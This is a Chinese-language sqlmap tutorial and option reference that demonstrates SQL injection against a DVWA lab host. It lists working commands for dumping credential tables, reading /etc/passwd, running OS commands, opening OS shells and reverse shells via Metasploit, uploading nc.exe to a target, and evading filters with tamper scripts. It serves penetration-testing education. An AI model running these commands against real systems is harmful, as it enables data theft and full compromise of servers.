# 使用访问URL方法SQL注入该网站

> 获取除系统默认表外的所有数据 --dump-all --exclude-sysdbs

①判断注入点和数据类型

sqlmap -u http://192.168.140.134/dvwa/vulnerabilities/sqli/?id=1

判断数据库名（--current-db可判断当前数据库名）

 sqlmap -u http://192.168.140.134/dvwa/vulnerabilities/sqli/?id=1 --dbs 

判断表名

sqlmap -u http://192.168.140.134/dvwa/vulnerabilities/sqli/?id=1 -D dvwa --tables

判断列名

sqlmap -u http://192.168.140.134/dvwa/vulnerabilities/sqli/?id=1 -D dvwa -T users --column

获取字段

sqlmap -u http://192.168.140.134/dvwa/vulnerabilities/sqli/?id=1 -D dvwa -T users -C password --dump

#  使用加载外部文件方法注入该网站

先抓包，然后保存为url.txt

然后再执行sqlmap -r /etc/url.txt

判断数据库名sqlmap -r /etc/url.txt --dbs

判断表名sqlmap -r /etc/url.txt -D dvwa --tables

判断列名sqlmap -r /etc/url.txt -D dvwa -T users --column

获取具体字段名：如上图中的users表的password列

sqlmap -r /etc/url.txt -D dvwa -T users -C password --dump

获取除系统默认表外的所有数据 sqlmap -r /etc/url.txt --dump-all --exclude-sysdbs



```shell
sqlmap.py -u "http://192.168.109.139/news?id=1" --current-user #获取当前用户名称
sqlmap.py -u "http://192.168.109.139/news?id=1" --current-db #获取当前数据库名称
sqlmap.py -u "http://192.168.109.139/news?id=1" --tables -D "db_name" #列表名
sqlmap.py -u "http://192.168.109.139/news?id=1" --columns -T "tablename" users-D "db_name" -v 0 #列字段
sqlmap.py -u "http://192.168.109.139/news?id=1" --dump -C "column_name" -T "table_name" -D "db_name" -v 0 #获取字段内容
******************信息获取****************** 
sqlmap.py -u "http://192.168.109.139/news?id=1" --smart --level 3 --users # smart 智能 level 执行测试等级
sqlmap.py -u "http://192.168.109.139/news?id=1" --dbms "Mysql" --users # dbms 指定数据库类型
sqlmap.py -u "http://192.168.109.139/news?id=1" --users #列数据库用户
sqlmap.py -u "http://192.168.109.139/news?id=1" --dbs#列数据库
sqlmap.py -u "http://192.168.109.139/news?id=1" --passwords #数据库用户密码
sqlmap.py -u "http://192.168.109.139/news?id=1" --passwords-U root -v 0 #列出指定用户数据库密码
sqlmap.py -u "http://192.168.109.139/news?id=1" --dump -C "password,user,id" -T "tablename" -D "db_name" --start 1 --stop 20 #列出指定字段，列出 20 条
sqlmap.py -u "http://192.168.109.139/news?id=1" --dump-all -v 0 #列出所有数据库所有表
sqlmap.py -u "http://192.168.109.139/news?id=1" --privileges #查看权限
sqlmap.py -u "http://192.168.109.139/news?id=1" --privileges -U root #查看指定用户权限
sqlmap.py -u "http://192.168.109.139/news?id=1" --is-dba -v 1 #是否是数据库管理员
sqlmap.py -u "http://192.168.109.139/news?id=1" --roles #枚举数据库用户角色
sqlmap.py -u "http://192.168.109.139/news?id=1" --udf-inject #导入用户自定义函数（获取系统权限！）
sqlmap.py -u "http://192.168.109.139/news?id=1" --dump-all --exclude-sysdbs -v 0 #列出当前库所有表
sqlmap.py -u "http://192.168.109.139/news?id=1" --union-cols #union 查询表记录
sqlmap.py -u "http://192.168.109.139/news?id=1" --cookie "COOKIE_VALUE" #cookie 注入
sqlmap.py -u "http://192.168.109.139/news?id=1" -b #获取 banner 信息
sqlmap.py -u "http://192.168.109.139/news?id=1" --data "id=3" #post 注入
sqlmap.py -u "http://192.168.109.139/news?id=1" -v 1 -f #指纹判别数据库类型
sqlmap.py -u "http://192.168.109.139/news?id=1" --proxy"http://127.0.0.1:8118" #代理注入
sqlmap.py -u "http://192.168.109.139/news?id=1"--string"STRING_ON_TRUE_PAGE" #指定关键词
sqlmap.py -u "http://192.168.109.139/news?id=1" --sql-shell #执行指定 sql 命令
sqlmap.py -u "http://192.168.109.139/news?id=1" --file /etc/passwd  #必须为dbs权限
sqlmap.py -u "http://192.168.109.139/news?id=1" --file-write 本地文件路径 file-dest 目标路径  #必须为dbs权限(可将本地的某个文件写入到目标路径下)
sqlmap.py -u "http://192.168.109.139/news?id=1" --os-cmd=whoami #执行系统命令
sqlmap.py -u "http://192.168.109.139/news?id=1" --os-shell #系统交互 shell
sqlmap.py -u "http://192.168.109.139/news?id=1" --os-pwn #反弹 shell
sqlmap.py -u "http://192.168.109.139/news?id=1" --reg-read #读取 win 系统注册表
sqlmap.py -u "http://192.168.109.139/news?id=1" --dbs-o "sqlmap.log" #保存进度
sqlmap.py -u "http://192.168.109.139/news?id=1" --dbs -o "sqlmap.log" --resume #恢复已保存进度
sqlmap.py -u "http://192.168.109.139/news?id=1" --msf-path=/opt/metasploit3/msf2 --os-pwn 反弹 shell 需 metasploit 路径
sqlmap.py -u "http://192.168.109.139/news?id=1" --tamper "base64encode.py" 加载脚本(可利用绕过注入限制)
sqlmap.py -u "http://192.168.109.139/news?id=1" --batch --tamper "base64encode.py" 加载脚本(可利用绕过注入限制)
sqlmap -g "google 语法" --dump-all --batch #google 搜索注入点自动 跑出所有字段
sqlmap.py -u "http://192.168.109.139/news?id=1" --forms  #post提交方式注入
sqlmap.py -r 本地数据包路径 #post提交方式注入
```





## 1.3 SQL使用参数详解

本文以SQLmap 1.1.8-8版本为例，对其所有参数进行详细的分析和讲解，便于在使用时进行查询。

用法: sqlmap.py [**选项**]

### 1.3.1 选项

>  -h,--help 显示基本帮助信息并退出
>
>  -hh  显示高级帮助信息并退出
>
>  --version 显示程序版本信息并退出
>
> -vVERBOSE信息级别: 0-6 （缺省1），其值具体含义：“0”只显示python错误以及严重的信息；1同时显示基本信息和警告信息（默认）；“2”同时显示debug信息；“3”同时显示注入的payload；“4”同时显示HTTP请求；“5”同时显示HTTP响应头；“6”同时显示HTTP响应页面；如果想看到sqlmap发送的测试payload最好的等级就是3。

### 1.3.2 目标

在这些选项中必须提供至少有一个确定目标

>  -d DIRECT  直接连接数据库的连接字符串
>
> -u URL, --url=URL  目标URL (e.g."http://www.site.com/vuln.php?id=1")，使用-u或者--url
>
> -l LOGFILE   从Burp或者WebScarab代理日志文件中分析目标
>
> -x SITEMAPURL 从远程网站地图（sitemap.xml）文件来解析目标
>
> -m BULKFILE   将目标地址保存在文件中，一行为一个URL地址进行批量检测。
>
> -r REQUESTFILE  从文件加载HTTP请求，sqlmap可以从一个文本文件中获取HTTP请求，这样就可以跳过设置一些其他参数（比如cookie，POST数据，等等），请求是HTTPS的时需要配合这个--force-ssl参数来使用，或者可以在Host头后门加上:443
>
> -g GOOGLEDORK   从谷歌中加载结果目标URL（只获取前100个结果，需要挂代理）
>
> -c CONFIGFILE    从配置ini文件中加载选项

### 1.3.3 请求

这些选项可以用来指定如何连接到目标URL

--method=METHOD  强制使用给定的HTTP方法（例如put）

```
    --data=DATA   通过POST发送数据参数，sqlmap会像检测GET参数一样检测POST的参数。--data="id=1" -f --banner --dbs --users
```

  --param-del=PARA.. 当GET或POST的数据需要用其他字符分割测试参数的时候需要用到此参数。

  --cookie=COOKIE   HTTP Cookieheader 值

  --cookie-del=COO.. 用来分隔cookie的字符串值

  --load-cookies=L.. Filecontaining cookies in Netscape/wget format

  --drop-set-cookie  IgnoreSet-Cookie header from response

  --user-agent=AGENT 默认情况下sqlmap的HTTP请求头中User-Agent值是：sqlmap/1.0-dev-xxxxxxx([http://sqlmap.org](http://sqlmap.org/))可以使用--user-agent参数来修改，同时也可以使用--random-agent参数来随机的从./txt/user-agents.txt中获取。当--level参数设定为3或者3以上的时候，会尝试对User-Angent进行注入

  --random-agent   使用random-agent作为HTTP User-Agent头值

  --host=HOST     HTTP Hostheader value

  --referer=REFERER  sqlmap可以在请求中伪造HTTP中的referer，当--level参数设定为3或者3以上的时候会尝试对referer注入

  -H HEADER, --hea.. 额外的http头(e.g."X-Forwarded-For: 127.0.0.1")

  --headers=HEADERS 可以通过--headers参数来增加额外的http头(e.g."Accept-Language: fr\nETag: 123")

  --auth-type=AUTH.. HTTP的认证类型 (Basic, Digest, NTLM or PKI)

  --auth-cred=AUTH.. HTTP 认证凭证(name:password)

  --auth-file=AUTH.. HTTP 认证PEM证书/私钥文件；当Web服务器需要客户端证书进行身份验证时，需要提供两个文件:key_file，cert_file,key_file是格式为PEM文件，包含着你的私钥，cert_file是格式为PEM的连接文件。

  --ignore-401    Ignore HTTPError 401 (Unauthorized)忽略HTTP 401错误（未授权的）

  --ignore-proxy   忽略系统的默认代理设置

  --ignore-redirects忽略重定向的尝试

  --ignore-timeouts  忽略连接超时

  --proxy=PROXY    使用代理服务器连接到目标URL

  --proxy-cred=PRO.. 代理认证凭证(name:password)

  --proxy-file=PRO.. 从文件加载代理列表

  --tor        使用Tor匿名网络

  --tor-port=TORPORT 设置Tor代理端口

  --tor-type=TORTYPE 设置Tor代理类型 (HTTP,SOCKS4 or SOCKS5 (缺省))

  --check-tor    检查Tor的是否正确使用

  --delay=DELAY  可以设定两个HTTP(S)请求间的延迟，设定为0.5的时候是半秒，默认是没有延迟的。

  --timeout=TIMEOUT  可以设定一个HTTP(S)请求超过多久判定为超时，10表示10秒，默认是30秒。

  --retries=RETRIES  当HTTP(S)超时时，可以设定重新尝试连接次数，默认是3次。

  --randomize=RPARAM可以设定某一个参数值在每一次请求中随机的变化，长度和类型会与提供的初始值一样

  --safe-url=SAFEURL 提供一个安全不错误的连接，每隔一段时间都会去访问一下

  --safe-post=SAFE.. 提供一个安全不错误的连接，每次测试请求之后都会再访问一遍安全连接。

  --safe-req=SAFER.. 从文件中加载安全HTTP请求

  --safe-freq=SAFE.. 测试一个给定安全网址的两个访问请求

  --skip-urlencode  跳过URL的有效载荷数据编码

  --csrf-token=CSR.. Parameter usedto hold anti-CSRF token参数用来保存反CSRF令牌

  --csrf-url=CSRFURL URL地址访问提取anti-CSRF令牌

  --force-ssl     强制使用SSL/HTTPS

  --hpp        使用HTTP参数污染的方法

  --eval=EVALCODE   在有些时候，需要根据某个参数的变化，而修改另个一参数，才能形成正常的请求，这时可以用--eval参数在每次请求时根据所写python代码做完修改后请求。(e.g "import hashlib;id2=hashlib.md5(id).hexdigest()")

 sqlmap.py -u"http://www.target.com/vuln.php?id=1&hash=c4ca4238a0b923820dcc509a6f75849b"--eval="import hashlib;hash=hashlib.md5(id).hexdigest()"

### 1.3.4 优化

这些选项可用于优化sqlmap性能

> -o        打开所有的优化开关
>
> --predict-output  预测普通查询输出
>
> --keep-alive    使用持久HTTP（S）连接
>
> --null-connection  获取页面长度
>
> --threads=THREADS  当前http(s)最大请求数 (默认 1)

### 1.3.5 注入

这些选项可用于指定要测试的参数、提供自定义注入有效载荷和可选的篡改脚本。

>   -p TESTPARAMETER  可测试的参数
>
>   --skip=SKIP     跳过对给定参数的测试
>
>   --skip-static    跳过测试不显示为动态的参数
>
>   --param-exclude=.. 使用正则表达式排除参数进行测试（e.g. "ses"）
>
>   --dbms=DBMS     强制后端的DBMS为此值
>
>   --dbms-cred=DBMS.. DBMS认证凭证(user:password)
>
>   --os=OS      强制后端的DBMS操作系统为这个值
>
>   --invalid-bignum  使用大数字使值无效
>
>   --invalid-logical  使用逻辑操作使值无效
>
>   --invalid-string  使用随机字符串使值无效
>
>   --no-cast     关闭有效载荷铸造机制
>
>   --no-escape     关闭字符串逃逸机制
>
>   --prefix=PREFIX   注入payload字符串前缀
>
>   --suffix=SUFFIX   注入payload字符串后缀
>
>   --tamper=TAMPER  使用给定的脚本篡改注入数据

### 1.3.6 检测

这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容

>   --level=LEVEL   执行测试的等级（1-5，默认为1）
>
>   --risk=RISK    执行测试的风险（0-3，默认为1）
>
>   --string=STRING  查询时有效时在页面匹配字符串
>
>   --not-string=NOT.. 当查询求值为无效时匹配的字符串
>
>   --regexp=REGEXP   查询时有效时在页面匹配正则表达式
>
>   --code=CODE    当查询求值为True时匹配的HTTP代码
>
>   --text-only    仅基于在文本内容比较网页
>
>   --titles      仅根据他们的标题进行比较

### 1.3.7 技巧

 这些选项可用于调整具体的SQL注入测试

>   --technique=TECH  SQL注入技术测试（默认BEUST）
>
>   --time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）
>
>   --union-cols=UCOLS 定列范围用于测试UNION查询注入
>
>   --union-char=UCHAR 暴力猜测列的字符数
>
>   --union-from=UFROM SQL注入UNION查询使用的格式
>
>   --dns-domain=DNS.. DNS泄露攻击使用的域名
>
>   --second-order=S.. URL搜索产生的结果页面

### 1.3.8 指纹

> -f, --fingerprint  执行广泛的DBMS版本指纹检查

### 1.3.9 枚举

这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行自定义的SQL语句。

>   -a, --all      获取所有信息
>
>   -b, --banner    获取数据库管理系统的标识
>
>   --current-user   获取数据库管理系统当前用户
>
>   --current-db    获取数据库管理系统当前数据库
>
>   --hostname     获取数据库服务器的主机名称
>
>   --is-dba      检测DBMS当前用户是否DBA
>
>   --users       枚举数据库管理系统用户
>
>   --passwords     枚举数据库管理系统用户密码哈希
>
>   --privileges    枚举数据库管理系统用户的权限
>
>   --roles      枚举数据库管理系统用户的角色
>
>   --dbs       枚举数据库管理系统数据库
>
>   --tables      枚举的DBMS数据库中的表
>
>   --columns     枚举DBMS数据库表列
>
>   --schema      枚举数据库架构
>
>   --count       检索表的项目数，有时候用户只想获取表中的数据个数而不是具体的内容，那么就可以使用这个参数：sqlmap.py -u url --count -D testdb
>
>   --dump      转储数据库表项
>
>   --dump-all     转储数据库所有表项
>
>   --search      搜索列（S），表（S）和/或数据库名称（S）
>
>   --comments     获取DBMS注释
>
>   -D DB        要进行枚举的指定数据库名
>
>   -T TBL       DBMS数据库表枚举
>
>   -C COL       DBMS数据库表列枚举
>
>   -X EXCLUDECOL   DBMS数据库表不进行枚举
>
>   -U USER      用来进行枚举的数据库用户
>
>   --exclude-sysdbs  枚举表时排除系统数据库
>
>   --pivot-column=P.. Pivot columnname
>
>   --where=DUMPWHERE  Use WHEREcondition while table dumping
>
>   --start=LIMITSTART 获取第一个查询输出数据位置
>
>   --stop=LIMITSTOP  获取最后查询的输出数据
>
>   --first=FIRSTCHAR  第一个查询输出字的字符获取
>
>   --last=LASTCHAR  最后查询的输出字字符获取
>
>   --sql-query=QUERY  要执行的SQL语句
>
>   --sql-shell     提示交互式SQL的shell
>
>   --sql-file=SQLFILE 要执行的SQL文件

### 1.3.10 暴力

这些选项可以被用来运行暴力检查

>   --common-tables   检查存在共同表
>
>   --common-columns  检查存在共同列

### 1.3.11 用户自定义函数注入

这些选项可以用来创建用户自定义函数

>   --udf-inject  注入用户自定义函数
>
>   --shared-lib=SHLIB 共享库的本地路径

### 1.3.12 访问文件系统

这些选项可以被用来访问后端数据库管理系统的底层文件系统

>   --file-read=RFILE  从后端的数据库管理系统文件系统读取文件，SQL Server2005中读取二进制文件example.exe:
>
> sqlmap.py -u"http://192.168.136.129/sqlmap/mssql/iis/get_str2.asp?name=luther"--file-read "C:/example.exe" -v 1
>
>   --file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件
>
>   --file-dest=DFILE  后端的数据库管理系统写入文件的绝对路径

在kali中将/software/nc.exe文件上传到C:/WINDOWS/Temp下：

python sqlmap.py -u"http://192.168.136.129/sqlmap/mysql/get_int.aspx?id=1" --file-write"/software/nc.exe" --file-dest "C:/WINDOWS/Temp/nc.exe" -v1

### 1.3.13 操作系统访问

这些选项可以用于访问后端数据库管理系统的底层操作系统

>   --os-cmd=OSCMD  执行操作系统命令（OSCMD）
>
>   --os-shell     交互式的操作系统的shell
>
>   --os-pwn     获取一个OOB shell，meterpreter或VNC
>
>   --os-smbrelay    一键获取一个OOBshell，meterpreter或VNC
>
>   --os-bof      存储过程缓冲区溢出利用
>
>   --priv-esc     数据库进程用户权限提升
>
>   --msf-path=MSFPATH MetasploitFramework本地的安装路径
>
>   --tmp-path=TMPPATH 远程临时文件目录的绝对路径

linux查看当前用户命令：

sqlmap.py -u"http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1" --os-cmd id -v1

### 1.3.14 Windows注册表访问

这些选项可以被用来访问后端数据库管理系统Windows注册表

>   --reg-read     读一个Windows注册表项值
>
>   --reg-add      写一个Windows注册表项值数据
>
>   --reg-del      删除Windows注册表键值
>
>   --reg-key=REGKEY  Windows注册表键
>
>   --reg-value=REGVAL Windows注册表项值
>
>   --reg-data=REGDATA Windows注册表键值数据
>
>   --reg-type=REGTYPE Windows注册表项值类型

### 1.3.15 一般选项

这些选项可以用来设置一些一般的工作参数

>   -s SESSIONFILE   保存和恢复检索会话文件的所有数据
>
>   -t TRAFFICFILE   记录所有HTTP流量到一个文本文件中
>
>   --batch      从不询问用户输入，使用所有默认配置。
>
>   --binary-fields=.. 结果字段具有二进制值(e.g."digest")
>
>   --charset=CHARSET  强制字符编码
>
>   --crawl=CRAWLDEPTH 从目标URL爬行网站
>
>   --crawl-exclude=.. 正则表达式从爬行页中排除
>
>   --csv-del=CSVDEL  限定使用CSV输出 (default",")
>
>   --dump-format=DU.. 转储数据格式(CSV(default), HTML or SQLITE)
>
>   --eta       显示每个输出的预计到达时间
>
>   --flush-session   刷新当前目标的会话文件
>
>   --forms      解析和测试目标URL表单
>
>   --fresh-queries   忽略在会话文件中存储的查询结果
>
>   --hex       使用DBMS Hex函数数据检索
>
>   --output-dir=OUT.. 自定义输出目录路径
>
>   --parse-errors   解析和显示响应数据库错误信息
>
>   --save=SAVECONFIG  保存选项到INI配置文件
>
>   --scope=SCOPE  从提供的代理日志中使用正则表达式过滤目标
>
>   --test-filter=TE.. 选择测试的有效载荷和/或标题(e.g. ROW)
>
>   --test-skip=TEST.. 跳过试验载荷和/或标题(e.g.BENCHMARK)
>
>   --update      更新sqlmap

### 1.3.16 其他

>   -z MNEMONICS    使用短记忆法 (e.g."flu,bat,ban,tec=EU")
>
>   --alert=ALERT    发现SQL注入时，运行主机操作系统命令
>
>   --answers=ANSWERS  当希望sqlmap提出输入时，自动输入自己想要的答案(e.g. "quit=N,follow=N")，例如：sqlmap.py -u"http://192.168.22.128/get_int.php?id=1"--technique=E--answers="extending=N" --batch
>
>   --beep  发现sql注入时，发出蜂鸣声。
>
>   --cleanup   清除sqlmap注入时在DBMS中产生的udf与表。
>
>   --dependencies   Check formissing (non-core) sqlmap dependencies
>
>   --disable-coloring 默认彩色输出，禁掉彩色输出。
>
>   --gpage=GOOGLEPAGE 使用前100个URL地址作为注入测试，结合此选项，可以指定页面的URL测试
>
>   --identify-waf   进行WAF/IPS/IDS保护测试，目前大约支持30种产品的识别
>
>   --mobile   有时服务端只接收移动端的访问，此时可以设定一个手机的User-Agent来模仿手机登陆。
>
>   --offline      Work inoffline mode (only use session data)
>
>   --purge-output   从输出目录安全删除所有内容，有时需要删除结果文件，而不被恢复，可以使用此参数，原有文件将会被随机的一些文件覆盖。
>
>   --skip-waf      跳过WAF／IPS / IDS启发式检测保护
>
>   --smart      进行积极的启发式测试，快速判断为注入的报错点进行注入
>
>   --sqlmap-shell   互动提示一个sqlmapshell
>
>   --tmp-dir=TMPDIR  用于存储临时文件的本地目录
>
>   --web-root=WEBROOT Web服务器的文档根目录(e.g."/var/www")
>
>   --wizard  新手用户简单的向导使用，可以一步一步教你如何输入针对目标注入





